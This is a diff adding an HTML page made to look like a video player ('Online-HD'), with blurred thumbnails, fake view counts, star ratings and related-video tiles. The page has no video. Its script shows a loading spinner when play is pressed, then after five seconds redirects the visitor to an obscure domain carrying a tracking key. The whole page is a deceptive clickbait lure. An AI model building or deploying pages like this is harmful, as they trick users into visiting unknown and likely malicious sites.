@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online-HD</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background:#000; color:#fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            padding-top:56px;
+        }
+        header {
+            position:fixed; top:0; left:0; right:0; height:56px;
+            background:#0d0d0d; display:flex; align-items:center;
+            justify-content:space-between; padding:0 18px;
+            border-bottom:1px solid #222; z-index:100;
+        }
+        .logo { position:absolute; left:50%; transform:translateX(-50%);
+                font-weight:bold; font-size:19px; }
+        .logo span { color:#ff9800; }
+
+        .video-title { padding:16px 16px 8px; font-size:17.5px; color:#bbb; }
+
+        .video-wrapper { padding:0 12px; }
+        .video-container {
+            width:100%; padding-bottom:133.33%; position:relative;
+            border-radius:12px; overflow:hidden; background:#000;
+            box-shadow:0 8px 25px rgba(0,0,0,0.7);
+        }
+        
+        .video-bg {
+            position:absolute; top:-5%; left:-5%; right:-5%; bottom:-5%;
+            background:center/cover no-repeat;
+            background-image:url('https://files.catbox.moe/v039j9.jpg');
+            filter:blur(5px) brightness(0.7); 
+            transform:scale(1.1);
+            z-index: 1;
+            transition: background-image 1s ease-in-out; 
+        }
+        
+        .video-overlay {
+            position:absolute; top:0; left:0; right:0; bottom:0;
+            background:rgba(0,0,0,0.3); 
+            display:flex;
+            align-items:center; justify-content:center;
+            z-index: 2;
+        }
+        
+        .play-button {
+            width:88px; height:88px; background:rgba(255,255,255,0.18);
+            border-radius:50%; display:flex; align-items:center; justify-content:center;
+            border:3px solid rgba(255,255,255,0.25); box-shadow:0 8px 30px rgba(0,0,0,0.6);
+            backdrop-filter:blur(4px); animation:pulse 2.5s infinite;
+            position: relative;
+            z-index: 3;
+            cursor: pointer; 
+        }
+        @keyframes pulse {
+            0%,100% { box-shadow:0 8px 30px rgba(0,0,0,0.6); }
+            50% { box-shadow:0 8px 45px rgba(255,152,0,0.4); }
+        }
+
+        .spinner {
+            display: none; 
+            width: 36px;
+            height: 36px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ff9800; 
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .is-loading svg { display: none; }
+        .is-loading .spinner { display: block; }
+
+        .bottom-bar {
+            padding:14px 18px; background:#0d0d0d; display:flex;
+            justify-content:space-between; align-items:center; border-top:1px solid #222;
+        }
+        .views { color:#ff4444; font-size:15.5px; font-weight:600; }
+        .rating svg { width:26px; height:26px; fill:#ffb400; filter:drop-shadow(0 0 4px #ff9800); }
+
+        .related-section { padding:28px 12px 40px; }
+        .related-title { padding-left:8px; margin-bottom:16px; font-size:19px; color:#ccc; }
+        .related-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; padding:0 4px; }
+        
+        .related-item {
+            height:108px; 
+            background-color:#1b1b1b;
+            background-size:cover;
+            background-position:center;
+            border-radius:10px; 
+            border:1px solid #2c2c2c;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* এখানে পরিবর্তন করা হয়েছে: backdrop-filter যোগ করা হয়েছে ছবি ব্লার করার জন্য */
+        .related-item::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.45); /* কালো ভাব একটু কমানো হয়েছে */
+            backdrop-filter: blur(3px); /* ছবির উপর হালকা ব্লার */
+            -webkit-backdrop-filter: blur(3px);
+            z-index: 1;
+        }
+
+        .related-item::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to left, transparent 0%, rgba(255, 255, 255, 0.4) 50%, transparent 100%);
+            transform: skewX(-20deg);
+            animation: scanRightToLeft 1.5s infinite linear;
+            z-index: 2;
+        }
+
+        @keyframes scanRightToLeft {
+            0% { transform: translateX(150%) skewX(-20deg); }
+            100% { transform: translateX(-150%) skewX(-20deg); }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ff9800" stroke-width="3" stroke-linecap="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+    <div class="logo">Online<span>-HD</span></div>
+    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ff9800" stroke-width="3" stroke-linecap="round">
+        <circle cx="11" cy="11" r="8"></circle>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+    </svg>
+</header>
+
+<div class="video-title">Vid-35-No.8165224-full.mp4</div>
+
+<div class="video-wrapper">
+    <div class="video-container">
+        <!-- Main background that will rotate -->
+        <div class="video-bg" id="mainVideoBg"></div>
+        <div class="video-overlay">
+            <div class="play-button" id="playBtn">
+                <svg width="44" height="44" viewBox="0 0 24 24" fill="#ffffff">
+                    <polygon points="7,4 20,12 7,20 7,4"></polygon>
+                </svg>
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="bottom-bar">
+    <div class="views">Heart Views: 41,691</div>
+    <div class="rating">
+        <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+        <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+        <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+        <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+        <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+    </div>
+</div>
+
+<div class="related-section">
+    <div class="related-title">Related videos</div>
+    <div class="related-grid" id="relatedGrid">
+        <div class="related-item" style="background-image: url('https://files.catbox.moe/7fpmsc.jpg');"></div>
+        <div class="related-item" style="background-image: url('https://files.catbox.moe/g06y94.jpg');"></div>
+        <div class="related-item" style="background-image: url('https://files.catbox.moe/b6vke5.jpg');"></div>
+        <div class="related-item" style="background-image: url('https://files.catbox.moe/v039j9.jpg');"></div>
+    </div>
+</div>
+
+<!-- জাভাস্ক্রিপ্ট -->
+<script>
+    const playBtn = document.getElementById('playBtn');
+    const mainVideoBg = document.getElementById('mainVideoBg');
+    const relatedGrid = document.getElementById('relatedGrid');
+    const relatedItems = relatedGrid.querySelectorAll('.related-item');
+
+    // Collect all unique images from the related section into an array
+    const imageList = [];
+    relatedItems.forEach(item => {
+        const bgImageUrl = item.style.backgroundImage;
+        if (bgImageUrl && bgImageUrl !== 'initial') {
+            imageList.push(bgImageUrl);
+        }
+    });
+
+    let currentImageIndex = 0;
+
+    // Function to update the main video background image
+    function rotateMainImage() {
+        if (imageList.length === 0) return; 
+
+        currentImageIndex = (currentImageIndex + 1) % imageList.length;
+        mainVideoBg.style.backgroundImage = imageList[currentImageIndex];
+    }
+
+    // Interval to trigger image rotation every 1 hour (60 * 60 * 1000 milliseconds)
+    const rotationInterval = setInterval(rotateMainImage, 60 * 60 * 1000); 
+
+    // Start with the first image on page load
+    if (imageList.length > 0) {
+        mainVideoBg.style.backgroundImage = imageList[0];
+    }
+
+    // Play button functionality
+    playBtn.addEventListener('click', function() {
+        this.classList.add('is-loading');
+
+        setTimeout(function() {
+            window.location.href = 'https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c';
+        }, 5000);
+    });
+</script>
+
+</body>
+</html>
